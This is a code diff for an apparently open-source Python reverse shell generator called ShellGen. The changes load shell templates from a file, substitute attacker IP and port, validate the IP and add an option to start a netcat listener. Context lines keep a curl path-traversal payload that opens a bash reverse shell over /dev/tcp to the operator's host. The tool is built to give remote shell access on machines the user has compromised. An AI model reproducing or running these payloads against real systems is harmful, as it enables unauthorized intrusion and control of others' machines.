@@ -11,15 +11,18 @@ import os
 import argparse
 import subprocess
 from time import sleep
+from sys import argv
+from os import path
 from src.design import print_error, print_info, print_shell, print_shell_types, bcolors, print_list_shells
-from src.core import return_shells
+import re
+#from src.core import return_shells
 
 # Support between python2 and python3
 try: input = raw_input
 except: pass
 
 # List of shells available
-shells = ["bash","go","nc","curl","netcat","msfvenom","perl","php","python","powershell","ruby","xterm","telnet"]
+#shells = ["Fuck! Something isn't right :/"]
 
 # funny random banner
 import random
@@ -62,7 +65,7 @@ def update():
 
 
 def banner():
-	__version__ = "0.9.1"
+	__version__ = "1.1"
 
 	banner = bcolors.DARKGREEN + """
 	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
@@ -81,15 +84,11 @@ def banner():
 
 	banner += """
 	Reverse shell generator.
-	Generates a shellcode to gain access remotley to any
-	machine you have 'compromised'.
-	
-	If you find a bug report it.
-	If you want a new feature, make it or request it
-	
+	Generates a shellcode to remotley gain access to a machine you've compromised
+
 	"""
 
-	banner += "Welcome to ShellGen - where shells are generated... Because..." + bcolors.BOLD + funny + bcolors.ENDC + "\n"
+	banner += "Welcome to ShellGen - where shells are generated... Because..." + bcolors.BOLD + bcolors.RED+ funny + bcolors.ENDC + "\n"
 
 	banner += bcolors.RED + bcolors.BOLD + """
 	!!!!!! DISCLAIMER !!!!!!
@@ -105,6 +104,42 @@ def return_curl_shell():
 	curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
 	print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)
 
+def return_shells(shell, ip, port):
+	with open("src/shells.txt","r") as list_shells:
+		shells = list_shells.readlines()
+		count = 0
+		for i in shells:
+			desc, cmd = i.split("|", 1)
+			cmd = cmd.replace("[IPADDR]", ip)
+			cmd = cmd.replace("[PORT]", port)
+			type_shell = cmd.split(" ")[0]
+			type_shell = type_shell.lower()
+			if shell == type_shell:
+				count += 1
+				print_shell_types(desc)
+				print(cmd)
+			elif shell == 'all':
+				count += 1
+				print_shell_types(desc)
+				print(cmd)
+		if count == 0:
+			print("No shells were able to be returned since '" + shell + "' is not in the list")
+			sys.exit()
+
+def verify_ip(ip):
+	# for validating an Ip-address 
+	regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
+		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$'''
+
+	# pass the regular expression 
+	# and the string in search() method 
+	if (re.search(regex, ip)):
+		print(bcolors.BOLDGREEN + "[*] " + bcolors.ENDC + "IP address is valid")
+	else:
+		print(bcolors.BOLDRED + "[!] " + bcolors.ENDC + "Invalid Ip address. Please try again...")
+		sys.exit()
 
 def main():
 	try:
@@ -117,6 +152,7 @@ def main():
 		group.add_argument("-u", "--update", help="When given this argument it will update and continue", action="store_true")
 		group.add_argument("-ls", "--shells", help="Lists all available shells", action="store_true")
 		group.add_argument("-c", "--create-launcher", help="Creates a launcher to run anywhere in terminal (REQUIRES SUDO) | Not required to use if you used trustedsec/ptf", action="store_true")
+		group.add_argument("-l", "--start-listener", help="Start listener after generating a reverse shell", action="store_true")
 		group.add_argument("--no-update", help="Skip the update", action="store_true")
 		#group.add_argument("-m", "--manual", help="Read the manual for guidance (Shows README.md file)", action="store_true")
 		
@@ -129,57 +165,71 @@ def main():
 			create_launcher()
 			sys.exit()
 		
+		# Get the list of shells available
 		if args.shells:
-			for i in shells:
-				print_shell_types(i)
-			sys.exit()
-		
+			listshells = []
+			with open("src/shells.txt","r") as fshells:
+				shellsx = fshells.readlines()
+				for shell in shellsx:
+					shell = shell.replace("\n","").split("|")[0].lower()
+					if shell not in listshells:
+						listshells.append(shell)
+						print_shell(shell)
+					else:
+						pass
+
 		if args.no_update:
 			update = False
 		else:
 			update = True
 		
-		if args.lhost:
-			print_info("Running through checks now...")
-			sleep(0.5)
-			print_info("IP has been given... %s" % (bcolors.RED + bcolors.BOLD + args.lhost + bcolors.ENDC))
-			ip = args.lhost
-		else:
-			print_info("If you are not sure how to use this, run the tool adding '--help' for help menu\n")
-			ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-			print_error("No IP was given...")
-			print_info("Using your VPN IP address... %s" % (bcolors.RED + bcolors.BOLD + ip + bcolors.ENDC))
-			
-		if args.lport:
-			print_info("Port has been given... %s" % (bcolors.RED + bcolors.BOLD + str(args.lport) + bcolors.ENDC))
+		if args.lhost and args.lport and args.shell:
+			verify_ip(args.lhost)
 			port = args.lport
+			ip = args.lhost
+			shell = args.shell
+			return_shells(shell, ip, port)
+		elif args.lhost and args.lport and not args.shell:
+			verify_ip(args.lhost)
+			print_info("No shell was given so will display all shells available")
+			ip = args.lhost
+			port = args.lport
+			shell = 'all'
+			return_shells(shell, ip, port)
+		elif args.lhost and args.shell and not args.lport:
+			verify_ip(args.lhost)
+			print_info("Port was not provided but will use the default port '4444'")
+			port = '4444'
+			ip = args.lhost
+			shell = args.shell
+			return_shells(shell, ip, port)
 		else:
-			port = "4444"
-			print_info("No port given but going to use the default... %s" % (bcolors.RED + bcolors.BOLD + str(port) + bcolors.ENDC))
+			print_error("Something went wrong!")
+			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Local Port: " + bcolors.BOLDRED + args.lport + bcolors.ENDC)
+			except: print(bcolors.BOLD + bcolors.RED + "[!]" + bcolors.ENDC + " Port not given")
+			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Local host: " + bcolors.BOLDRED + args.lhost + bcolors.ENDC)
+			except: print(bcolors.BOLDRED + "[!]" + bcolors.ENDC + " Local IP not given")
+			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Type of shell: " + bcolors.BOLDRED + args.shell + bcolors.ENDC)
+			except: print(bcolors.BOLDRED + "[!]" + bcolors.ENDC + " Shell not given")
 
-		if args.shell:
-			print_info("A shell type was given also... %s" % (bcolors.RED + bcolors.BOLD + args.shell + bcolors.ENDC))
-			if "curl" in args.shell:
-				return_curl_shell()
+
+		if args.start_listener:
+			if not args.lport:
+				print_info("Make sure you gave me the port to listen on.")
 				sys.exit()
-			if "msfvenom" in args.shell:
-				#target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
-				from src.msfvenompayloads import msfvenom_shells
-				return msfvenom_shells(ip, port)
+			os.system('nc -lnvp {}'.format(port))
+			'''run_listener = input("Would you like to start a listener now? (Y/n) ").lower()
+			if run_listener == 'y':
+				c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
+				if c == 'l':
+					if int(port) < 1024:
+						system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+					else:
+						system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))
 			else:
-				shell = args.shell
-				return_shells(shell, ip, port)
-		else:
-			shell = input("\nWhat shell would you like to use? ")
-			if shell in shells:
-				print_info("OK. Now I have a shell to use...")
-				return_shells(shell, ip, port)
-				sys.exit()
-			elif shell == 'all':
-				return_shells(shell, ip, port)
-			else:
-				print_error("No shell was given again or shell entered is not available yet.")
-				sys.exit()
+				print("Ok. Exiting now!")
+				sys.exit()'''
+
 	
 	except KeyboardInterrupt:
 		print()
@@ -196,6 +246,11 @@ def main():
 
 if __name__ == "__main__":
 	try:
+		secret_list = ["covid","covid19","covid-19"]
+		if sys.argv[-1] in secret_list:
+			print("COVID-19 happened back in 2019-2020 that killed thousands of people")
+			print("The world since then has never been the same and never will")
+			sys.exit()
 		if not "--no-update" in sys.argv:
 			update()
 			os.system("clear")
